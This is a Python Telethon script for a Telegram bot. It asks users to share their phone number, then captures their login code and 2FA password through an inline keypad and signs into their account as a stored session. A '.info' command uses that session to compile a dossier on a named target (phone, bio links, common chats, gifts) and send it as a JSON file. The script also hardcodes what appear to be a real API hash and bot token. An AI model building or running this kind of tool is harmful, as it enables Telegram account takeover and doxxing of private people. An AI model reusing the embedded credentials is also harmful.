import asyncio
import json
import os
import re
from telethon import TelegramClient, events
from telethon.errors import RPCError, SessionPasswordNeededError
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.messages import GetCommonChatsRequest
from telethon.tl.custom import Button

# ========== КОНФИГ ==========
API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = '8960250081:AAGanel01wSbLUo1kD3P6lVyHZqUbcsxOmY'

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

# ========== КЛИЕНТ БОТА ==========
bot_client = TelegramClient(os.path.join(SESSION_DIR, 'bot_session'), API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_client = None
user_auth_data = {}

# ========== КЛАВИАТУРА ==========
def get_digit_keyboard():
    return [
        [Button.inline("1"), Button.inline("2"), Button.inline("3")],
        [Button.inline("4"), Button.inline("5"), Button.inline("6")],
        [Button.inline("7"), Button.inline("8"), Button.inline("9")],
        [Button.inline("0"), Button.inline("◀️"), Button.inline("✅")]
    ]

def get_clear_keyboard():
    return Button.clear()

# ========== ФУНКЦИИ ==========
async def get_user_gifts(client, user_id):
    try:
        full = await client(GetFullUserRequest(user_id))
        target = full.full_user if hasattr(full, 'full_user') else full
        if hasattr(target, 'gifts') and target.gifts:
            return [{'id': g.id, 'name': getattr(g, 'name', None)} for g in target.gifts]
        if hasattr(target, 'gifts_count') and target.gifts_count:
            return {'gifts_count': target.gifts_count}
    except Exception:
        pass
    return None

# ========== АВТОРИЗАЦИЯ ЧЕРЕЗ БОТА ==========
@bot_client.on(events.NewMessage)
async def auth_handler(event):
    global user_client
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    if chat_id != user_id:
        return

    if text == '/start':
        if user_client and user_client.is_connected():
            await event.reply("✅ Уже авторизован. Команда: .info @username")
            return
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply("🔐 Отправь номер", buttons=buttons)
        return

    if event.contact:
        phone = event.contact.phone_number
        if not phone or user_id in user_auth_data:
            return
        session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        try:
            result = await user_client.send_code_request(phone)
            user_auth_data[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'temp_input': ''
            }
            await event.reply(f"✅ Код на {phone[-4:]}\n\nВведи код:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.reply(f"❌ {e}")
        return

@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global user_client
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if user_id not in user_auth_data:
        await event.answer("Нажми /start", alert=True)
        return
    
    auth = user_auth_data[user_id]
    
    if data == '✅':
        code = auth.get('temp_input', '')
        if len(code) < 3:
            await event.answer("Короткий код", alert=True)
            return
        try:
            await user_client.sign_in(
                phone=auth['phone'],
                code=code,
                phone_code_hash=auth['phone_code_hash']
            )
            del user_auth_data[user_id]
            await event.edit("✅ Авторизован!\n\n.info @username", buttons=get_clear_keyboard())
            print("✅ АВТОРИЗАЦИЯ УСПЕШНА")
        except SessionPasswordNeededError:
            auth['state'] = 'password_waiting'
            auth['temp_input'] = ''
            await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
            del user_auth_data[user_id]
    elif data == '◀️':
        auth['temp_input'] = auth.get('temp_input', '')[:-1]
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif data.isdigit():
        auth['temp_input'] = auth.get('temp_input', '') + data
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif auth.get('state') == 'password_waiting':
        if data == '✅':
            pwd = auth.get('temp_input', '')
            if len(pwd) < 1:
                await event.answer("Введи пароль", alert=True)
                return
            try:
                await user_client.sign_in(password=pwd)
                del user_auth_data[user_id]
                await event.edit("✅ Авторизован!\n\n.info @username", buttons=get_clear_keyboard())
                print("✅ АВТОРИЗАЦИЯ УСПЕШНА (2FA)")
            except Exception:
                await event.answer("Неверный пароль", alert=True)
                auth['temp_input'] = ''
                await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())

# ========== КОМАНДА .info ==========
@bot_client.on(events.NewMessage)
async def info_handler(event):
    global user_client
    
    if not user_client:
        return
    
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id
    
    if chat_id == user_id:
        return
    
    if not text.startswith('.info'):
        return
    
    parts = text.split()
    if len(parts) < 2:
        await event.reply("❌ .info @username")
        return
    
    target_input = parts[1].replace('@', '')
    filename = "info.json"
    flag_s = False
    
    if len(parts) >= 3:
        if parts[2] == '-s':
            flag_s = True
        else:
            filename = parts[2]
            if filename.endswith('-s'):
                flag_s = True
                filename = filename[:-2]
    if len(parts) >= 4 and parts[3] == '-s':
        flag_s = True
    
    if not filename.endswith('.json'):
        filename += '.json'
    
    msg = await event.reply("⚙️ Собираю данные...")
    
    try:
        try:
            target_user = await user_client.get_entity(target_input)
        except ValueError:
            await msg.edit("❌ Неверный ID или юзернейм.")
            return
        except RPCError as e:
            await msg.edit(f"❌ Ошибка: {e}")
            return
        
        full_info = await user_client(GetFullUserRequest(target_user.id))
        user_full = full_info.full_user if hasattr(full_info, 'full_user') else full_info
        
        common_chats = []
        try:
            result = await user_client(GetCommonChatsRequest(peer=target_user, max_id=0, limit=100))
            common_chats = [{'id': ch.id, 'title': ch.title} for ch in result.chats]
        except Exception:
            pass
        
        gifts = await get_user_gifts(user_client, target_user.id)
        
        bio_text = getattr(user_full, 'about', '') or ''
        links = re.findall(r'https?://\S+|@[a-zA-Z0-9_]+', bio_text)
        
        data = {
            'id': target_user.id,
            'first_name': target_user.first_name,
            'last_name': target_user.last_name,
            'username': f"@{target_user.username}" if target_user.username else None,
            'phone': getattr(target_user, 'phone', None),
            'bio': bio_text,
            'links_in_bio': links,
            'verified': getattr(target_user, 'verified', False),
            'premium': getattr(target_user, 'premium', False),
            'bot': getattr(target_user, 'bot', False),
            'scam': getattr(target_user, 'scam', False),
            'fake': getattr(target_user, 'fake', False),
            'restricted': getattr(target_user, 'restricted', False),
            'common_chats_count': getattr(user_full, 'common_chats_count', 0),
            'common_chats': common_chats,
            'gifts': gifts,
            'photo_id': str(target_user.photo.photo_id) if target_user.photo else None,
            'status': str(target_user.status) if hasattr(target_user, 'status') else None,
        }
        
        if hasattr(user_full, 'stories_count'):
            data['stories_count'] = user_full.stories_count
        
        file_path = os.path.join(os.getcwd(), filename)
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        
        await user_client.send_file(chat_id, file_path, caption=f"📁 Досье: {target_user.first_name or target_user.id} → {filename}")
        
        if flag_s:
            pretty = json.dumps(data, ensure_ascii=False, indent=4)
            if len(pretty) <= 4000:
                await user_client.send_message(chat_id, f"<pre>{pretty}</pre>", parse_mode='html')
            else:
                for i in range(0, len(pretty), 4000):
                    await user_client.send_message(chat_id, f"<pre>{pretty[i:i+4000]}</pre>", parse_mode='html')
        
        await msg.edit(f"✅ Готово → {filename}")
        
    except Exception as e:
        await msg.edit(f"⚠️ Ошибка: {e}")

# ========== ЗАПУСК ==========
async def main():
    await bot_client.start()
    me = await bot_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print('👉 Напиши /start, авторизуй аккаунт')
    print('👉 Команда: .info @username')
    await bot_client.run_until_disconnected()

with bot_client:
    bot_client.loop.run_until_complete(main())